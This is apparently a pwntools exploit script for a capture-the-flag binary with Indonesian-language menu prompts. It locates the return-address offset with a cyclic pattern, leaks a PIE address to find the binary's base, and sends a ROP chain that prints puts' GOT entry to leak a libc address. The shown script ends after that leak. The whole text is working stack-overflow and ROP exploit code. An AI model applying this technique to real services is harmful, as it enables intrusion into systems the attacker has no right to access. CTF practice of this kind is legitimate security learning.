from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def find_ip(payload):
    p = process(exe)
    p.sendline(b'3')
    p.sendlineafter(b'btw, kue pie nya enak gaaakkk hihi : ', payload)
    p.wait()
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 8), n=8)
    info(f'Located RIP offset at {ip_offset}')
    return ip_offset

context.log_level = "debug"

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = './chall'
elf = context.binary = ELF(exe, checksec=False)
rop = ROP(elf)

libc = ELF("./libc.so.6")

offset = find_ip(cyclic(500, n=8))
p = start()

p.sendline(b'2')
p.sendlineafter(b'ketik 1 dulu kalau mau ehe\n', b'1')
p.recvuntil(b'oke okeeeyy ini pie nya untukmuu, ')
leak_pie = int(p.recvline(), 16)
log.info(f'Leak PIE Address: {hex(leak_pie)}')

elf.address = leak_pie - elf.sym['main']
log.info(f'PIE base address: {hex(elf.address)}')

pop_rbp = elf.address + 0x0000000000001173
mov_rdi_rbp = elf.address + 0x00000000000011e7
ret = elf.address + rop.find_gadget(['ret'])[0]

payload = flat([
    b'A' * offset,
    pop_rbp, 
    elf.got['puts'],
    mov_rdi_rbp,
    b'B' * 8, 
    elf.plt['puts'],
    elf.sym['main']
])

p.sendline(b'3')
p.sendlineafter(b'btw, kue pie nya enak gaaakkk hihi : ', payload)
p.recvline()
p.recvline()
leak_puts = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info(f'Leaked puts address: {hex(leak_puts)}')
